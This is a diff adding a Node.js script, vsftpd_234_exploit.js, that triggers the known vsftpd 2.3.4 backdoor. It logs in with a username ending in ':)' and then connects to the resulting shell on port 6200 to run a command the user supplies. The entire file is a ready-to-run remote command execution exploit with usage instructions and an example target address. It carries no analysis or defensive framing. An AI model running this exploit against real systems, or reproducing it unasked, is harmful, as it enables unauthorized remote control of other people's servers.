@@ -1,0 +1,52 @@
+const net = require("net");
+
+function exploit(ip, port, command) {
+  console.log("[*] Attempting to trigger backdoor...");
+
+  const ftpSocket = new net.Socket();
+
+  ftpSocket.connect(port, ip, () => {
+    // Attempt to login to trigger backdoor
+    ftpSocket.write("USER letmein:)\n");
+    ftpSocket.write("PASS please\n");
+    setTimeout(() => {
+      ftpSocket.destroy();
+      console.log("[+] Triggered backdoor");
+      connectToBackdoor();
+    }, 2000);
+  });
+
+  ftpSocket.on("error", () => {
+    console.log("[!] Failed to trigger backdoor on", ip);
+  });
+
+  function connectToBackdoor() {
+    console.log("[*] Attempting to connect to backdoor...");
+
+    const backdoorSocket = new net.Socket();
+
+    backdoorSocket.connect(6200, ip, () => {
+      console.log("[+] Connected to backdoor on", `${ip}:6200`);
+      backdoorSocket.write(`${command}\n`);
+    });
+
+    backdoorSocket.on("data", (data) => {
+      const response = data.toString("utf-8");
+      console.log("[+] Response:\n", response);
+      backdoorSocket.destroy();
+    });
+
+    backdoorSocket.on("error", () => {
+      console.log("[!] Failed to connect to backdoor on", `${ip}:6200`);
+    });
+  }
+}
+
+if (process.argv.length < 5) {
+  console.log(
+    "Usage: node vsftpd_234_exploit.js <IP address> <port> <command>"
+  );
+  console.log("Example: node vsftpd_234_exploit.js 192.168.1.10 21 whoami");
+} else {
+  exploit(process.argv[2], parseInt(process.argv[3]), process.argv[4]);
+}
